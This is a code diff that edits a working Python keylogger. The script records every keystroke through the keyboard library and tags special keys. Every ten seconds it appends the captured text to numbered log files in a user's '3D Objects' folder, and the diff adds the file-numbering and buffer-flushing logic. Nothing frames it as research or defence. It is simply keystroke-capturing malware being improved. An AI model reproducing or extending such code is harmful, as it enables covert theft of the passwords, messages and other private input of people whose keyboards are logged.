@@ -1,7 +1,13 @@
-import time
-import keyboard
+import time, keyboard, os
 start_time = time.time()
 buff = ''
+n=0
+while True:
+    if os.path.exists(f'C:\\Users\\DELL\\3D Objects\\logs{n}.txt'):
+        n+=1
+    else:
+        path = f'C:\\Users\\DELL\\3D Objects\\logs{n}.txt'
+        break
 while True:
     try:
         while True:
@@ -23,7 +29,7 @@ while True:
                     case "right shift":
                         key1 = ""
                     case "caps lock":
-                        key1 = "|CP|"
+                        key1 = "|CL|"
                     case _:
                         if len(key)>1:
                             key1 = f'|{key.upper()}|'
@@ -31,8 +37,9 @@ while True:
                 elapsed_time = time.time() - start_time
                 if elapsed_time >= 10.0:
                     start_time = time.time()
-                    with open('C:\\Users\\Bob\\3D Objects\\logs.txt', 'w') as f:
+                    with open(path, 'a') as f:
                         f.write(buff)
+                        buff = ''
     except:
         print("error")
     time.sleep(1)
